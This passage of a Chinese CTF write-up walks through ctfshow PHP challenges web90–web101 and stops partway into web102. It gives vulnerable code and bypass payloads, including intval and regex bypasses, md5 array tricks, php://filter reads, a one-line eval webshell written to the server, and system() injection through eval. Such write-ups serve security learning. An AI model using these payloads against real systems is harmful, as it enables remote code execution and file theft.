class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>与上题类似，但这次没过滤数字</p>\n<p>这里又要说一下<code>intval</code>的相关特性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>如果 <code>base</code> 是 0，通过检测 <code>var</code> 的格式来决定使用的进制：</p>\n<ul>\n<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>\n<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>\n<li>将使用 10 进制 (decimal)。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;4476a&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;010574&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;0x117c&#x27;,0)=4476</span><br></pre></td></tr></table></figure>\n\n<p>上述三中均能绕过</p>\n<h3 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class=\"line\">        echo &#x27;hacker&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &#x27;nonononono&#x27;;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>我们先来看看 <code>正则匹配修饰符</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i 不区分(ignore)大小写；</span><br><span class=\"line\">g 全局(global)匹配</span><br><span class=\"line\">m 多(more)行匹配</span><br><span class=\"line\">s 特殊字符圆点 . 中包含换行符</span><br><span class=\"line\">U 只匹配最近的一个字符串;不重复匹配; </span><br><span class=\"line\">//修正符:x 将模式中的空白忽略; </span><br><span class=\"line\">//修正符:A 强制从目标字符串开头匹配;</span><br><span class=\"line\">//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class=\"line\">//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </span><br></pre></td></tr></table></figure>\n\n<p><code>(preg_match(&#39;/^php$/im&#39;, $a))</code>这个匹配以php开头的字符串并且多行匹配</p>\n<p><code>(preg_match(&#39;/^php$/i&#39;, $a))</code>这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行</p>\n<blockquote>\n<p>preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾</p>\n</blockquote>\n<p><code>%0a</code>换行，相当于enter</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=%0aphp</span><br><span class=\"line\">或?cmd=php%0a1   (但php%0a不行)</span><br></pre></td></tr></table></figure>\n\n<p>这里我有个小小的疑惑点，针对第一个 <code>%0aphp</code>显然这里是匹配的第一行，第二个payload <code>php%0a1</code>，显然这里匹配的是第二行，所以具体的匹配机制有点没懂</p>\n<p>请假了一下群里的师傅这里主要跟<code>^php$</code>这个有关，<code>(preg_match(&#39;/^php$/i&#39;, $a))</code>这个以一整行为一个整体进行判断，经过测试这个只匹配第一行</p>\n<h3 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法</p>\n</blockquote>\n<p>所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=0b1000101111100</span><br><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n\n<p>比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，</p>\n<p>八进制是以数字0开头的，刚好可以绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一题相对于上一题，不让数字0出现在第一位,而且第一个if是<code>===</code>强比较</p>\n<p>我们可以用小数 <code>4476.0</code>绕过 或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br></pre></td></tr></table></figure>\n\n<p>可以在前面加上一个加号，当空格</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=+010574</span><br><span class=\"line\">?num= 010574//空格也可以</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里第一个判断又换成弱比较了，只能用 空格和 <code>+</code> 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br><span class=\"line\">?num=+010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class=\"line\">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;no no no&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这题没什么过滤直接读当前目录下的flag.php就好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=./flag.php</span><br></pre></td></tr></table></figure>\n\n<p>或者用伪协议读取也行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class=\"line\">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class=\"line\">echo $flag;</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#x27;Wrong.&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>题目需要我们用post方式传入a和b，并且a!&#x3D;b（这里是弱比较）</p>\n<p>但这里<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code>这里我们可以利用一个字符串比较的一个特性</p>\n<blockquote>\n<p>MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class=\"line\">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` </span><br></pre></td></tr></table></figure>\n\n<p>这句话解释一下，这是三目运算符</p>\n<p>当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>如果传的flag&#x3D;’flag’,则把COOKIE传参地址给get,否则让其等于’flag’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; </span><br></pre></td></tr></table></figure>\n\n<p>如果传的flag&#x3D;’flag’,则把SERVER传参地址给get,否则让其等于’flag’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__</span><br></pre></td></tr></table></figure>\n\n<p>如果传入的HTTP_FLAG&#x3D;‘flag’显示$flag，否则显示当前页面</p>\n<p>如果我们直接用get方式传入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>由于存在GET传参，会把post传参地址给get</p>\n<p>所以这里我们随便用get方式传入一个，然后用post覆盖掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=1111</span><br><span class=\"line\"></span><br><span class=\"line\">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值</p>\n<h3 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$allow = array();</span><br><span class=\"line\">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class=\"line\">    array_push($allow, rand(1,$i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class=\"line\">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p><code>array_push</code></p>\n<blockquote>\n<p>array_push — 将一个或多个单元压入数组的末尾（入栈）</p>\n</blockquote>\n<p><code>in_array</code></p>\n<blockquote>\n<p>检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较</p>\n</blockquote>\n<p>分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中</p>\n<p>由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）</p>\n<p>然后是 1.php在进行判断时 <code>1.php == 1</code></p>\n<p>并将一句话木马写入content</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?n=1.php</span><br><span class=\"line\"></span><br><span class=\"line\">POST:content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>蚁剑连接即可</p>\n<h3 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>is_numeric</code></p>\n<blockquote>\n<p>— 检测变量是否为数字或数字字符串</p>\n</blockquote>\n<p>这个题第一次做的时候时非常懵逼的</p>\n<p>这题的解题点在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>\n\n<p>这里就要讲一下运算符的优先级问题了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or</span><br></pre></td></tr></table></figure>\n\n<p>所以题目这里赋值的优先级大于and，即</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1)</span><br></pre></td></tr></table></figure>\n\n<p>所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，</p>\n<p>现在就要解决</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>突然发现题目注释里有  <code>flag in class ctfshow; </code></p>\n<p>我这里直接用管道符了<code>||</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这个题相比上个，增加了许多过滤</p>\n<p>主要还是构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); </span><br></pre></td></tr></table></figure>\n\n<p>这里也是看了很多师傅的wp才理解，需要讲一下</p>\n<p><code>ReflectionClasss</code></p>\n<blockquote>\n<p>反射类ReflectionClass执行命令</p>\n<p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作<br>反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令</p>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n<p>最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯</p>\n<h3 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 